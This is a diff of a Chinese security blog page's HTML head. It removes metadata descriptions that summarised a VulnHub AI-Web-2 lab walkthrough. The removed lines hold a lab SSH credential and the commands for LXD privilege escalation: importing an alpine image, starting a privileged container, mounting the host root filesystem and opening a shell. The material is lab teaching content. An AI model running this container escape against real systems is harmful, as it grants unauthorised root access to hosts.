@@ -4,21 +4,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LXD&amp;docker镜像-rbash绕过</title>
     <meta charset="utf-8">
-    <meta name="description" content="Ladder@LXD容器 LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。
-lxd本地提权条件:
-已经获得Shell 用户属于lxd组 复现环境
-https://www.vulnhub.com/entry/ai-web-2,357/
-1、入口点 通过web打点,拿到www-data的权限
-apache配置文件 /etc/apache2/sites-enabled/000-default.conf 翻找目录发现 /var/www/html/webadmin/S0mextras 目录下面有一个账号密码的文件 .sshUserCred55512.txt
-``` User: n0nr00tuser Pass: zxowieoi4sdsadpEClDws1sf ``` 连接 SSH
-ssh n0nr00tuser@192.168.88.154 zxowieoi4sdsadpEClDws1sf 2、检测及利用 ./LinEnum.sh 或 id 判断用户组
-小镜像来源
-https://github.com/saghul/lxd-alpine-builder
-3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权 创建容器镜像：
-lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test 启动特权容器：
-lxc init test test -c security.privileged=true 挂载宿主机磁盘：
-lxc config device add test test disk source=/ path=/mnt/root recursive=true 启动并进入：
-lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag.">
+    <meta name="description" content="Ladder@LXD&amp;docker镜像-rbash绕过 - Hzhsec home">
     <meta name="author" content="hzhsec">
     <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/5.lxd%E9%95%9C%E5%83%8F_rbash%E7%BB%95%E8%BF%87/">
 
@@ -30,21 +16,7 @@ lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag.">
 <script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>
 
     <meta property="og:title" content="LXD&amp;docker镜像-rbash绕过" />
-<meta property="og:description" content="LXD容器 LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。
-lxd本地提权条件:
-已经获得Shell 用户属于lxd组 复现环境
-https://www.vulnhub.com/entry/ai-web-2,357/
-1、入口点 通过web打点,拿到www-data的权限
-apache配置文件 /etc/apache2/sites-enabled/000-default.conf 翻找目录发现 /var/www/html/webadmin/S0mextras 目录下面有一个账号密码的文件 .sshUserCred55512.txt
-``` User: n0nr00tuser Pass: zxowieoi4sdsadpEClDws1sf ``` 连接 SSH
-ssh n0nr00tuser@192.168.88.154 zxowieoi4sdsadpEClDws1sf 2、检测及利用 ./LinEnum.sh 或 id 判断用户组
-小镜像来源
-https://github.com/saghul/lxd-alpine-builder
-3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权 创建容器镜像：
-lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test 启动特权容器：
-lxc init test test -c security.privileged=true 挂载宿主机磁盘：
-lxc config device add test test disk source=/ path=/mnt/root recursive=true 启动并进入：
-lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag." />
+<meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/5.lxd%E9%95%9C%E5%83%8F_rbash%E7%BB%95%E8%BF%87/" /><meta property="article:section" content="list" />
 <meta property="article:published_time" content="2025-11-16T16:00:00+08:00" />
@@ -52,21 +24,7 @@ lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag." />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="LXD&amp;docker镜像-rbash绕过"/>
-<meta name="twitter:description" content="LXD容器 LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。
-lxd本地提权条件:
-已经获得Shell 用户属于lxd组 复现环境
-https://www.vulnhub.com/entry/ai-web-2,357/
-1、入口点 通过web打点,拿到www-data的权限
-apache配置文件 /etc/apache2/sites-enabled/000-default.conf 翻找目录发现 /var/www/html/webadmin/S0mextras 目录下面有一个账号密码的文件 .sshUserCred55512.txt
-``` User: n0nr00tuser Pass: zxowieoi4sdsadpEClDws1sf ``` 连接 SSH
-ssh n0nr00tuser@192.168.88.154 zxowieoi4sdsadpEClDws1sf 2、检测及利用 ./LinEnum.sh 或 id 判断用户组
-小镜像来源
-https://github.com/saghul/lxd-alpine-builder
-3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权 创建容器镜像：
-lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test 启动特权容器：
-lxc init test test -c security.privileged=true 挂载宿主机磁盘：
-lxc config device add test test disk source=/ path=/mnt/root recursive=true 启动并进入：
-lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag."/>
+<meta name="twitter:description" content=""/>
 
 
 <script type="application/ld+json">
@@ -95,7 +53,7 @@ lxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag."/>
   "@type": "BlogPosting",
   "headline": "LXD\u0026docker镜像-rbash绕过",
   "name": "LXD\u0026docker镜像-rbash绕过",
-  "description": "LXD容器 LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。\nlxd本地提权条件:\n已经获得Shell 用户属于lxd组 复现环境\nhttps://www.vulnhub.com/entry/ai-web-2,357/\n1、入口点 通过web打点,拿到www-data的权限\napache配置文件 /etc/apache2/sites-enabled/000-default.conf 翻找目录发现 /var/www/html/webadmin/S0mextras 目录下面有一个账号密码的文件 .sshUserCred55512.txt\n``` User: n0nr00tuser Pass: zxowieoi4sdsadpEClDws1sf ``` 连接 SSH\nssh n0nr00tuser@192.168.88.154 zxowieoi4sdsadpEClDws1sf 2、检测及利用 ./LinEnum.sh 或 id 判断用户组\n小镜像来源\nhttps://github.com/saghul/lxd-alpine-builder\n3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权 创建容器镜像：\nlxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test 启动特权容器：\nlxc init test test -c security.privileged=true 挂载宿主机磁盘：\nlxc config device add test test disk source=/ path=/mnt/root recursive=true 启动并进入：\nlxc start test lxc exec test /bin/sh cd /mnt/root/root cat flag.",
+  "description": "",
   "keywords": [
     
   ],
